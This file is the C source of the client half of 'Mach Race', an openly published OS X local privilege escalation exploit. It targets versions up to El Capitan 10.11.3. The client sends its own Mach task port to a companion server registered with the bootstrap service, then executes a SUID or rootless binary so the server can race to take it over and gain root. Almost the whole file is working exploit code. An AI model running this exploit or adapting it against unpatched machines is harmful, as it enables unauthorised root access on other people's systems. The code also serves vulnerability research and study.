/*
 * ______  ___            ______
 * ___   |/  /_____ _________  /_
 * __  /|_/ /_  __ `/  ___/_  __ \
 * _  /  / / / /_/ // /__ _  / / /
 * /_/  /_/  \__,_/ \___/ /_/ /_/
 * ________
 * ___  __ \_____ ___________
 * __  /_/ /  __ `/  ___/  _ \
 * _  _, _// /_/ // /__ /  __/
 * /_/ |_| \__,_/ \___/ \___/
 *
 * Mach Race OS X Local Privilege Escalation Exploit
 *
 * Created by reverser on 27/04/15.
 * Copyright (c) fG!, 2015, 2016. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * mach_race_client
 *
 * Tested against Mavericks 10.10.5, Yosemite 10.10.5, El Capitan 10.11.2 and 10.11.3
 * Fixed in El Capitan 10.11.4
 *
 * Should work with all OS X versions (depends if bootstrap_register2 exists on older versions)
 * Alternative implementation with bootstrap_create_server possible for older versions
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/sysctl.h>
#include <errno.h>
#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>

#include "logging.h"
#include "simple_ipc_common.h"
#include "utils.h"

int main(int argc, const char * argv[])
{
    if (argc < 2)
    {
        fprintf(stderr, "ERROR: Please specify target SUID or rootless binary...\n");
        return EXIT_FAILURE;
    }

    kern_return_t      kr;
    msg_format_recv_t  recv_msg;
    msg_format_send_t  send_msg;
    mach_msg_header_t *recv_hdr, *send_hdr;
    mach_port_t        client_port, server_port;
    
    DEBUG_MSG("Looking up server...");
    kr = bootstrap_look_up(bootstrap_port, SERVICE_NAME, &server_port);
    EXIT_ON_MACH_ERROR("bootstrap_look_up", kr, BOOTSTRAP_SUCCESS);
    
    kr = mach_port_allocate(mach_task_self(),        // our task is acquiring
                            MACH_PORT_RIGHT_RECEIVE, // a new receive right
                            &client_port);           // with this name
    EXIT_ON_MACH_ERROR("mach_port_allocate", kr, KERN_SUCCESS);
    
    // prepare request
    send_hdr                   = &(send_msg.header);
    send_hdr->msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, \
                                                MACH_MSG_TYPE_MAKE_SEND);
    send_hdr->msgh_bits       |= MACH_MSGH_BITS_COMPLEX;
    send_hdr->msgh_size        = sizeof(send_msg);
    send_hdr->msgh_remote_port = server_port;
    send_hdr->msgh_local_port  = client_port;
    send_hdr->msgh_reserved    = 0;
    send_hdr->msgh_id          = DEFAULT_MSG_ID;
    
    /* send our mach_task_self port to the server */
    send_msg.body.msgh_descriptor_count = 1;
    send_msg.data.name = mach_task_self();
    send_msg.data.disposition = MACH_MSG_TYPE_COPY_SEND;
    send_msg.data.type = MACH_MSG_PORT_DESCRIPTOR;
    
    mach_msg_option_t msg_options = MACH_SEND_MSG;
    DEBUG_MSG("Sending message to server...");
    // send request
    kr = mach_msg(send_hdr,              // message buffer
                  msg_options,         // option indicating send
                  send_hdr->msgh_size,   // size of header + body
                  0,                     // receive limit
                  MACH_PORT_NULL,        // receive name
                  MACH_MSG_TIMEOUT_NONE, // no timeout, wait forever
                  MACH_PORT_NULL);       // no notification port
    EXIT_ON_MACH_ERROR("mach_msg(send)", kr, MACH_MSG_SUCCESS);
    
    DEBUG_MSG("Waiting for server reply...");

    do { // receive reply
        recv_hdr                   = &(recv_msg.header);
        recv_hdr->msgh_remote_port = server_port;
        recv_hdr->msgh_local_port  = client_port;
        recv_hdr->msgh_size        = sizeof(recv_msg);
        
        /* we want to receive messages with the audit trailer */
        /* XXX: this is not really necessary and we can skip the extended trailer */
        msg_options = MACH_RCV_MSG | MACH_RCV_LARGE;
        msg_options |= MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0);
        msg_options |= MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
        
        kr = mach_msg(recv_hdr,              // message buffer
                      msg_options,          // option indicating receive
                      0,                     // send size
                      recv_hdr->msgh_size,   // size of header + body
                      client_port,           // receive name
                      MACH_MSG_TIMEOUT_NONE, // no timeout, wait forever
                      MACH_PORT_NULL);       // no notification port
        EXIT_ON_MACH_ERROR("mach_msg(recv)", kr, MACH_MSG_SUCCESS);
        
        DEBUG_MSG("Received server reply!");
    } while (recv_hdr->msgh_id != DEFAULT_MSG_ID);
    
    /* add a sleep to let the server start attempting to write */
    sleep(1);
    /* now execute the target binary, either SUID or rootless 
     * and hope for the best :-)
     */
    char *cmd[] = { (char*)argv[1], (char *)0 };
    char *spawnedEnv[] = { NULL };
#if DEBUG
    printf("Executing target and hopefully get exploited...\n");
#endif
    execve((char*)argv[1], cmd, spawnedEnv);

    return 0;
}
